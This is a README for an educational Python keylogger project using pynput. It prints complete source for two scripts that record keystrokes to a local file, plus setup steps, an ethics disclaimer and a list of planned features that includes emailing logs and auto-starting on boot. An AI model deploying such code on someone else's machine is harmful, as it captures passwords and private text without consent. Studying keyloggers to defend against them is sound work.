# 📈 Keylogger Project Documentation (Python + Pynput)

> **⚠️ Disclaimer**: This project is for **educational purposes only**. Using keyloggers to spy or steal information without consent is illegal and unethical. Always comply with local laws and obtain explicit permission before using this on any device.

## 🔖 Table of Contents

1. [Project Overview](#-project-overview)
2. [Tools & Technologies](#-tools--technologies)
3. [Project Structure](#-project-structure)
4. [Learning Concepts Explained](#-learning-concepts-explained)
5. [Code Breakdown](#-code-breakdown)
6. [Ethical Considerations](#-ethical-considerations)
7. [Setup Instructions](#-setup-instructions)
8. [Future Enhancements](#-future-enhancements)
9. [License & Disclaimer](#-license--disclaimer)

---

## ✨ 1. Project Overview

This project demonstrates how to create a **Keylogger** using Python and the `pynput` library. It includes:

- A **basic version** (`Basic_keylogger.py`) for beginners to log simple key presses.
- An **advanced version** (`Keylogger.py`) that handles special keys (e.g., `Enter`, `Space`).
- **Learning concept files** in the `Concepts/` folder to teach core ideas step-by-step.

**Goal**: Educational purpose only – to understand how keyloggers work and how to protect against them.

---

## ⚙️ 2. Tools & Technologies

- **Language**: Python 3.x
- **Library**: `pynput` (for keyboard monitoring)
- **Text File Logging**: Using Python's built-in `open()` method

---

## 🗂️ 3. Project Structure
Keylogger-Project/
├── Basic_keylogger.py         # Basic key press logger
├── Keylogger.py               # Advanced logger with special key handling
├── Concepts/                  # Learning examples
│   ├── keyboard_control.py    # Captures key inputs
│   ├── file_creation.py       # Creates and writes to a text file
│   ├── keystroke_listener.py  # Prints key presses
│   └── key_logging.py         # Logs keys with timestamps
├── Basic_key_log.txt          # Log output for Basic_keylogger.py (ignored by .gitignore)
├── log.txt                    # Log output for Keylogger.py (ignored by .gitignore)
├── requirements.txt           # Lists pynput dependency
├── .gitignore                 # Ignores logs and cache
└── README.md                  # Project summary

text

Copy

**requirements.txt**:
pynput

text

Copy

**.gitignore**:
Ignore log files
*.txt

Ignore Python cache
pycache/
*.pyc

Ignore IDE-specific files
.vscode/
.idea/

text

Copy

---

## 📚 4. Learning Concepts Explained

### 📜 keyboard_control.py
Demonstrates capturing key inputs using `pynput.keyboard.Listener`.  
**What You’ll Learn**: How to set up a basic keyboard listener and detect key presses.

### 📜 file_creation.py
Shows how to create a text file and write/append content using Python's `open()` method.  
**What You’ll Learn**: File handling in Python, including creating and appending to text files.

### 📜 keystroke_listener.py
Prints which key is pressed using the `on_press()` function with `pynput`.  
**What You’ll Learn**: How to process and display key press events in real-time.

### 📜 key_logging.py
Uses the `logging` module to log key presses with timestamps for structured records.  
**What You’ll Learn**: Structured logging with timestamps using Python’s `logging` module.

---



## 💻 5. Code Breakdown

### 📜 Basic_keylogger.py
This script logs printable keys (e.g., 'a', 'b') and special keys (e.g., `Enter`, `Space`) to `Basic_key_log.txt`. It stops when the `Esc` key is pressed.

```python
from pynput.keyboard import Listener, Key

# File where keystrokes will be logged
log_file = "Basic_key_log.txt"

# Function to handle key press events
def on_press(key):
    try:
        # Initialize the character to log
        letter = None
        # Handle printable keys
        if hasattr(key, 'char') and key.char is not None:
            letter = key.char
        # Handle special keys
        else:
            if key == Key.space:
                letter = "[Space]"
            elif key == Key.enter:
                letter = "[Enter]"
            elif key == Key.backspace:
                letter = "[Backspace]"
            elif key == Key.tab:
                letter = "[Tab]"
            elif key == Key.esc:
                letter = "[Esc]"
                print("Stopping... the keyboard listener.")
                return False  # Stop the listener
            else:
                return  # Skip other special keys (e.g., Shift, Ctrl)

        # Write the character to the log file
        with open(log_file, "a") as f:
            f.write(f"{letter}\n")

    except Exception as e:
        print(f"Error: {e}")

# Start listening for key presses
try:
    with Listener(on_press=on_press) as listener:
        print("Starting keyboard listener. Press Esc to stop.")
        listener.join()
except Exception as e:
    print(f"Failed to start listener: {e}")
Example Output in Basic_key_log.txt (typing "This is the out put of basic keylogger" followed by Esc):

text

Copy
T
h
i
s
[Space]
i
s
[Space]
t
h
e
[Space]
o
u
t
[Space]
p
u
t
[Space]
o
f
[Space]
b
a
s
i
c
[Space]
k
e
y
l
o
g
g
e
r
[Esc]
📜 Keylogger.py (Advanced)
This script logs keys with special handling for keys like Space, Enter, and Ctrl. It stops when the Esc key is pressed and logs to log.txt.

python

Copy
import logging
from pynput.keyboard import Listener, Key

# Configure logging with timestamps
logging.basicConfig(
    filename="Basic_key_log.txt",
    level=logging.INFO,
    format="%(asctime)s: %(message)s"
)

# Function to handle key press events
def on_press(key):
    try:
        letter = None
        if hasattr(key, 'char') and key.char is not None:
            letter = key.char
        else:
            if key == Key.space:
                letter = "[Space]"
            elif key == Key.enter:
                letter = "[Enter]"
            elif key == Key.backspace:
                letter = "[Backspace]"
            elif key == Key.tab:
                letter = "[Tab]"
            elif key == Key.esc:
                letter = "[Esc]"
                print("Stopping... the keyboard listener.")
                return False
            else:
                return

        logging.info(letter)  # Log with timestamp
    except Exception as e:
        print(f"Error: {e}")

try:
    with Listener(on_press=on_press) as listener:
        print("Starting keyboard listener. Press Esc to stop.")
        listener.join()
except Exception as e:
    print(f"Failed to start listener: {e}")
Example Output in log.txt (typing "This is the advance keylogger out put" followed by Backspace and Esc):

text

Copy
2025-05-11 12:34:56,123: T
2025-05-11 12:34:56,124: h
2025-05-11 12:34:56,125: i
2025-05-11 12:34:56,126: s
2025-05-11 12:34:56,127: [Space]
2025-05-11 12:34:56,128: [Esc]


---



⚖️ 6. Ethical Considerations
This project is for learning and ethical research purposes only.
Do not use this to spy or steal information. Unauthorized use is illegal and unethical.
Always obtain explicit consent before using on someone else’s device.
Protect Against Keyloggers:
Use antivirus software to detect malicious keyloggers.
Avoid downloading software from untrusted sources.
Regularly check running processes for suspicious activity (e.g., on Windows, use Task Manager; on Linux, use ps or top).


---



🚀 7. Setup Instructions
Step 1: Install Python
Ensure Python 3.x is installed. Download from python.org.

Step 2: Install pynput
Install the pynput library using pip:

bash

Copy
pip install pynput
Or, if using requirements.txt:

bash

Copy
pip install -r requirements.txt
Step 3: Clone the Repository
Clone the repository from GitHub:

bash

Copy
git clone https://github.com/Aishwary90/Keylogger.git
cd Keylogger
Step 4: Run a Script
For the basic keylogger:
bash

Copy
python Basic_keylogger.py
For the advanced keylogger:
bash

Copy
python Keylogger.py
To explore learning concepts, run any script in the Concepts/ folder, e.g.:
bash

Copy
python Concepts/keyboard_control.py
Note: On Windows, you may need to grant accessibility permissions for pynput to monitor keyboard events (check your security settings).


## 🧪 Testing the Keyloggers

To test the keyloggers and replicate the example outputs:

1. Run the script (`Basic_keylogger.py` or `Keylogger.py`).
2. Type the phrase "This is the out put..." (or "This is the advance keylogger out put" for `Keylogger.py`).
3. Press `Backspace` (for `Keylogger.py`) and then `Esc` to stop.
4. Check the corresponding log file (`Basic_key_log.txt` or `log.txt`) to see the output.



---



🔄 8. Future Enhancements
Add timestamps to logs using the logging module (as shown in key_logging.py).
Encrypt the log file for security.
Send logs via email (with user consent, for educational testing).
Add a GUI using Tkinter for a user-friendly interface.
Enable auto-start on system boot (for educational testing purposes only).


---



📜 9. License & Disclaimer
This project is licensed under the MIT License. All activities using this code must comply with your local laws. Unauthorized use is prohibited. The author is not responsible for misuse of this software.
